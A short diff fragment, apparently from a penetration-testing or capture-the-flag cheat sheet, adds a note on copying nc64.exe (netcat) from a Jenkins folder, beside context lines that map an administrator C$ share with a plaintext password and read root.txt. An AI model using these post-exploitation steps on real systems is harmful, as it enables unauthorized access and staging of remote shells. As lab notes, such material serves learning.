@@ -458,3 +458,7 @@ net use I: \\x.x.x.x\C$ /user:administrator "1234test"
 type I:\Users\Administrator\Desktop\root.txt
 
 
+#Copy Binary file (/b binary or /a ascii text file)
+copy /b C:\Users\Administrator\.jenkins\nc64.exe nc64.exe
+        1 file(s) copied.
+
